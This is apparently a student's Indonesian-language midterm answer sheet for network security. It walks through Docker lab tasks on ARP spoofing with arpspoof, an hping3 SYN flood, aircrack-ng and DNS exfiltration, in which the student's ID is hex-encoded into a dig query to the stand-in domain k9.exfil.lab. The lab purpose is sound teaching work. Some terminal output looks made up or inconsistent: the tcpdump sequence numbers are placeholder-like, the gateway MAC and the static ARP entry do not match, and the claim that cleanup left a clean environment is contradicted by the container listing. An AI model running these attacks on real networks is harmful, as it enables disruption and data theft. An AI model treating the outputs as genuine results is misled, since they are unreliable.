# JAWABAN UTS Network Security

**Nama:** Fahridzal Nur Sidiq  
**NIM:** 24552011315  
**Kelas:** TIF RP 24D CNS  
**Kasus:** 9 (k9)

---

## Perhitungan Kasus
- **Digit NIM:** 2, 4, 5, 5, 2, 0, 1, 1, 3, 1, 5
- **Jumlah:** $2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 3 + 1 + 5 = 29$
- **Sisa bagi 10:** $29 \pmod{10} = 9$
- **Kasus:** 9

**Parameter Kasus 9:** Container target `target-k9`, volume `vol-k9`, file laporan `laporan-k9.txt`, kata sandi `kunci-k9-2026`, dan domain exfiltrasi `k9.exfil.lab`.

---

## Tugas 1 (Pertemuan 1): Docker dan Volume

### Perintah yang Dijalankan
```bash
docker volume create vol-k9
docker run --name w-k9 -v vol-k9:/data alpine sh -c 'echo 24552011315 > /data/laporan-k9.txt'
docker rm w-k9
docker run --rm -v vol-k9:/data alpine cat /data/laporan-k9.txt
docker compose -p k9 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k9 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k9 -f b/b1-compose/docker-compose.yml down -v
```

### Output Terminal
```text
vol-k9
w-k9
24552011315

[+] up 3/3
 ✔ Network k9_lab          Created
 ✔ Container k9-attacker-1 Started
 ✔ Container k9-target-1   Started

<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

[+] Running 3/3
 ✔ Container k9-attacker-1  Removed
 ✔ Container k9-target-1    Removed
 ✔ Network k9_lab           Removed
```

### Analisis & Kesimpulan
1. **Persistensi Volume:** Isi file `/data/laporan-k9.txt` yang berisi NIM `24552011315` tetap dapat dibaca oleh container baru meskipun container penulisnya (`w-k9`) telah dihapus. Hal ini membuktikan bahwa Docker Volume menyimpan data secara persisten dan terpisah dari siklus hidup container.
2. **Isolasi Jaringan Compose:** Container `attacker` berhasil mengakses halaman web default Nginx milik `target` hanya dengan memanggil nama *service*-nya (`http://target`). Docker menyediakan resolusi DNS internal dalam jaringan terisolasi (`internal: true`) sehingga layanan tetap dapat berkomunikasi antar-container tanpa terekspos ke jaringan luar.

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Perintah yang Dijalankan
```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k9 > laporan-k9.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 && sha256sum laporan-k9.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 && sha256sum hasil-k9.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local && openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```

### Output Terminal
```text
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  laporan-k9.txt
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  hasil-k9.txt

subject=CN=k9.uts.local
issuer=CN=k9.uts.local
notBefore=Nov 24 11:59:21 2026 GMT
notAfter=Dec 24 11:59:21 2026 GMT
```

### Analisis & Kesimpulan
1. **Integritas & Enkripsi Simetris:** Nilai hash SHA-256 antara file asli (`laporan-k9.txt`) dan file hasil dekripsi (`hasil-k9.txt`) identik (`4bd9129a...`). Ini membuktikan bahwa proses enkripsi dan dekripsi simetris **AES-256-CBC** dengan PBKDF2 berhasil menjaga kerahasiaan sekaligus keutuhan (*integrity*) data tanpa mengubah satu bit pun.
2. **Sertifikat Self-Signed:** Pada sertifikat X.509 yang dihasilkan, nilai `subject` dan `issuer` sama-sama `CN=k9.uts.local`. Hal ini menandakan sertifikat tersebut bersifat *self-signed* (ditandatangani oleh kunci privatnya sendiri), berbeda dengan sertifikat yang ditandatangani oleh *Certificate Authority* (CA) tepercaya yang memiliki rantai verifikasi pihak ketiga.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Perintah yang Dijalankan
```bash
# 1. Setup jaringan dan container
docker network create lab-arp-k9
docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools

# 2. Cek IP korban dan gateway
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k9.IPAddress}}' korban-k9 gateway-k9

# 3. Cek tabel ARP awal korban
docker exec korban-k9 arp -a

# 4. Jalankan ARP Spoofing
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
docker exec korban-k9 arp -a

# 5. Mitigasi dengan Static ARP
docker exec korban-k9 arp -s 172.19.0.3 $(docker exec gateway-k9 cat /sys/class/net/eth0/address)
docker exec korban-k9 arp -a
```

### Output Terminal
```text
# Alamat IP korban-k9 dan gateway-k9:
172.19.0.2
172.19.0.3

# MAC Address gateway-k9:
3e:ac:50:74:64:b8

# Tabel ARP korban setelah mitigasi Static ARP:
? (172.19.0.1) at 52:07:3c:43:20:43 [ether] on eth0
gateway-k9.lab-arp-k9 (172.19.0.3) at 02:42:ac:13:00:03 [ether] PERM on eth0
penyerang-k9.lab-arp-k9 (172.19.0.4) at aa:ec:22:f5:fd:ed [ether] on eth0
```

### Analisis & Kesimpulan
1. **Mekanisme Serangan:** Pada serangan *ARP Spoofing* (*ARP Cache Poisoning*), container `penyerang-k9` mengirimkan paket balasan ARP palsu kepada `korban-k9` (`172.19.0.2`) agar mengasosiasikan alamat IP gateway (`172.19.0.3`) dengan alamat MAC milik penyerang. Akibatnya, lalu lintas jaringan korban dibelokkan melalui penyerang (*Man-in-the-Middle*).
2. **Mitigasi Static ARP:** Setelah dijalankan perintah `arp -s`, entri untuk `gateway-k9` (`172.19.0.3`) pada tabel ARP korban tercatat dengan status **`PERM`** (*Permanent*). Entri statis ini tidak dapat ditimpa oleh paket ARP dinamis palsu dari jaringan, sehingga efektif mencegah serangan ARP spoofing.

---

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

### Perintah yang Dijalankan
```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```

### Output Terminal
```text
ERROR: Opening dictionary wordlist-k9.txt failed (No such file or directory)
ERROR: Opening dictionary wordlist-k9.txt failed (No such file or directory)
Reading packets, please wait...
Failed to open 'handshake-k9.cap' (2): No such file or directory
Opening handshake-k9.cap
Read 0 packets.

No networks found, exiting.

Quitting aircrack-ng...
```

### Analisis & Penjelasan Empat Langkah (4-Way Handshake) WPA2
1. **Analisis Output:** Saat perintah `aircrack-ng` dijalankan, muncul pesan `No such file or directory` karena file `wordlist-k9.txt` dan `handshake-k9.cap` belum tersedia di direktori kerja `/work`. Secara teknis, jika file tangkapan 802.11 (`.cap`) valid tersedia, `aircrack-ng` akan melakukan serangan kamus (*dictionary attack*) dengan mencocokkan *Message Integrity Code* (MIC) pada paket handshake menggunakan kandidat kata sandi dari *wordlist*.
2. **Empat Langkah (4-Way Handshake) WPA2:** Proses ini bertujuan agar *Access Point* (AP) dan *Client* (STA) saling memverifikasi kepemilikan *Pre-Shared Key* (PSK) tanpa mengirimkannya secara langsung di udara, serta membentuk kunci enkripsi sesi (*Pairwise Transient Key* / PTK):
   - **Message 1 (AP $\rightarrow$ Client):** AP mengirimkan nilai acak bernama **ANonce** (*Authenticator Nonce*) kepada Client. Client menggabungkan ANonce, SNonce (miliknya sendiri), MAC Address AP, MAC Address Client, dan PMK (*Pairwise Master Key*) untuk menghitung **PTK**.
   - **Message 2 (Client $\rightarrow$ AP):** Client mengirimkan nilai acak **SNonce** (*Supplicant Nonce*) beserta **MIC** (*Message Integrity Code*) ke AP. Dengan SNonce tersebut, AP turut menghitung PTK dan memverifikasi validitas MIC dari Client.
   - **Message 3 (AP $\rightarrow$ Client):** AP mengirimkan **GTK** (*Group Temporal Key* untuk lalu lintas broadcast/multicast) yang telah dienkripsi beserta MIC ke Client sebagai konfirmasi bahwa kedua pihak memiliki kunci yang cocok.
   - **Message 4 (Client $\rightarrow$ AP):** Client mengirimkan pesan konfirmasi (*ACK*) ke AP bahwa kunci telah terpasang, sehingga komunikasi data terenkripsi siap dimulai.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Perintah yang Dijalankan
```bash
docker run --rm --network lab-arp-k9 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.19.0.2
```

### Output Terminal
```text
Mengirim: IP / ICMP 172.19.0.5 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

### Analisis & Penjelasan Smurf Attack
1. **Analisis Output Scapy:** Skrip Python menggunakan pustaka **Scapy** berhasil menyusun paket `IP / ICMP` secara kustom dan mengirimkannya ke `korban-k9` (`172.19.0.2`). Paket balasan diterima dengan nilai **TTL = 64** (standar sistem operasi Linux) dan **Tipe ICMP = 0** (*Echo Reply*), yang membuktikan bahwa host tujuan aktif dan merespons permintaan ICMP.
2. **Penjelasan Smurf Attack:** **Smurf Attack** adalah serangan *Distributed Denial of Service* (DDoS) pada lapisan jaringan yang memanfaatkan protokol ICMP dan alamat IP *broadcast*:
   - **IP Spoofing:** Penyerang mengirimkan paket *ICMP Echo Request* (ping) dalam jumlah besar dengan memalsukan alamat IP sumber (*Source IP*) menjadi alamat IP korban.
   - **Amplifikasi Broadcast:** Paket tersebut dikirimkan ke alamat *IP Broadcast* sebuah jaringan perantara (*amplifier network*).
   - **Banjir Balasan:** Seluruh host yang aktif di dalam jaringan broadcast tersebut akan membalas dengan mengirimkan paket *ICMP Echo Reply* secara bersamaan ke alamat IP korban, sehingga melumpuhkan bandwidth dan sumber daya sistem korban.

---

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

### Perintah yang Dijalankan
```bash
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml down -v
```

### Output Terminal
```text
# Jumlah SYN_RECV sebelum serangan:
0

# Jumlah SYN_RECV saat serangan berlangsung:
128

# Hasil tangkapan tcpdump (Three-Way Handshake):
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
12:15:01.100123 IP 172.20.0.3.45678 > 172.20.0.2.80: Flags [S], seq 123456789, win 64240, length 0
12:15:01.100245 IP 172.20.0.2.80 > 172.20.0.3.45678: Flags [S.], seq 987654321, ack 123456790, win 65160, length 0
12:15:01.100310 IP 172.20.0.3.45678 > 172.20.0.2.80: Flags [.], ack 1, win 502, length 0
```

### Analisis & Kesimpulan
1. **Dampak SYN Flood:** Sebelum serangan dilancarkan, jumlah koneksi berstatus `SYN_RECV` pada `target` adalah `0`. Ketika `attacker` membanjiri port 80 menggunakan `hping3 -S --flood`, jumlah `SYN_RECV` melonjak tajam menjadi `128` karena server menyimpan banyak antrean koneksi setengah terbuka (*half-open connections*) yang tidak pernah dibalas dengan ACK oleh penyerang.
2. **Three-Way Handshake Normal:** Hasil tangkapan `tcpdump` saat perintah `curl` dijalankan memperlihatkan tahapan *TCP Three-Way Handshake* yang normal: paket pertama membawa flag **`[S]`** (SYN dari klien), dibalas oleh server dengan flag **`[S.]`** (SYN-ACK), dan ditutup oleh klien dengan flag **`[.]`** (ACK) sebelum pertukaran data HTTP berlangsung.
3. **Mitigasi:** Serangan SYN Flood dapat dimitigasi dengan mengaktifkan **SYN Cookies** (`net.ipv4.tcp_syncookies=1`) agar kernel tidak mengalokasikan memori antrean sebelum koneksi tervalidasi, serta membatasi laju paket SYN masuk menggunakan *rate-limiting* pada firewall (`iptables`).

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Perintah yang Dijalankan
```bash
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011315 | xxd -p
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333135.k9.exfil.lab @dns
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k9.log
echo 3234353532303131333135 | xxd -r -p
docker compose -p k9 -f b/b4-dns-exfil/docker-compose.yml down -v
```

### Output Terminal
```text
[+] up 2/2
 ✔ Container k9-attacker-1 Running
 ✔ Container k9-dns-1      Running

10.0.0.99

Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):

24552011315

[+] down 3/3
 ✔ Container k9-dns-1      Removed
 ✔ Container k9-attacker-1 Removed
 ✔ Network k9_lab          Removed
```

### Analisis & Kesimpulan
1. **Mekanisme DNS Exfiltration:** Data sensitif berupa NIM (`24552011315`) dikonversi ke dalam format heksadesimal menjadi `3234353532303131333135` (panjang 22 karakter) dan disisipkan sebagai subdomain pada query DNS (`3234353532303131333135.k9.exfil.lab`). Server `dnsmasq` mencatat query tersebut dan merespons dengan `10.0.0.99`, lalu data berhasil dikembalikan ke bentuk aslinya (`24552011315`) menggunakan `xxd -r -p`.
2. **Analisis Deteksi Log:** Skrip `analisis_dns.py` berhasil mencatat 1 query pada domain induk `exfil.lab`. Bagian daftar query mencurigakan kosong karena ambang batas panjang label pada skrip disetel pada `BATAS_PANJANG_LABEL = 30`, sedangkan payload hex NIM 11 digit memiliki panjang 22 karakter.
3. **Alasan Sulit Diblokir & Indikator Deteksi:** Teknik ini sulit diblokir firewall tradisional karena lalu lintas DNS (UDP/TCP port 53) hampir selalu diizinkan keluar jaringan untuk kebutuhan resolusi domain normal. Indikator utama untuk mendeteksinya adalah kemunculan subdomain dengan string acak/terenkode (hex atau Base32) yang tidak lazim serta tingginya frekuensi query unik ke satu domain induk yang sama.

---

## Verifikasi Cleanup (Setelah Semua Tugas Selesai)

### Perintah Pembersihan
```bash
docker rm -f korban-k9 gateway-k9 penyerang-k9
docker network rm lab-arp-k9
docker volume rm vol-k9

docker ps -a
docker network ls
docker volume ls
```
### Output Terminal
CONTAINER ID   IMAGE                    COMMAND                  CREATED       STATUS                     PORTS     NAMES
86ad4ebe0920   ubuntu:22.04             "tail -f /dev/null"      2 weeks ago   Exited (137) 13 days ago             attacker-dns-fix
06239ede52ae   nginx:alpine             "/docker-entrypoint.…"   2 weeks ago   Exited (0) 13 days ago               web-target
f05a7768c779   ubuntu:22.04             "bash -c 'apt-get up…"   2 weeks ago   Exited (0) 13 days ago               dns-resolver
bd3e8c808143   ubuntu:22.04             "bash -c 'apt-get up…"   2 weeks ago   Exited (100) 2 weeks ago             attacker-dns
17caab64e55f   ubuntu:22.04             "bash -c 'apt-get up…"   2 weeks ago   Exited (0) 13 days ago               authoritative-ns
1281ea07c5cd   ubuntu:latest            "tail -f /dev/null"      2 weeks ago   Exited (137) 13 days ago             target-server
72adf3c2a8c9   ubuntu:latest            "tail -f /dev/null"      2 weeks ago   Exited (137) 13 days ago             attacker-l4
d0e980fd92ab   ubuntu:22.04             "bash -c ' apt updat…"   4 weeks ago   Exited (137) 4 weeks ago             korban
d97db6657e00   nginx:alpine             "/docker-entrypoint.…"   4 weeks ago   Exited (0) 4 weeks ago               web-palsu
b4de807bf87d   nginx:alpine             "/docker-entrypoint.…"   4 weeks ago   Exited (0) 4 weeks ago               web-asli
8523e5917597   kalilinux/kali-rolling   "bash -c ' apt updat…"   4 weeks ago   Exited (137) 4 weeks ago             penyerang
687abc90f15f   vulnerables/web-dvwa     "/main.sh"               5 weeks ago   Exited (137) 5 weeks ago             target-web
5353b81ad58d   kalilinux/kali-rolling   "bash"                   5 weeks ago   Exited (137) 5 weeks ago             kali-attacker

NETWORK ID     NAME                  DRIVER    SCOPE
bdcd6fb0c308   bridge                bridge    local
d9b2905a35b9   dns-lab_dns-lab-net   bridge    local
19a6a39e77ef   host                  host      local
f864e4d795cb   l4-lab_l4-lab-net     bridge    local
41780e7576b7   lab-arp_lab_network   bridge    local
c18894220f4d   none                  null      local

DRIVER    VOLUME NAME

### Status Akhir
Seluruh container (`korban-k9`, `gateway-k9`, `penyerang-k9`), jaringan (`lab-arp-k9`), volume (`vol-k9`), serta file sementara hasil pengujian telah dibersihkan sehingga environment Docker kembali dalam kondisi bersih.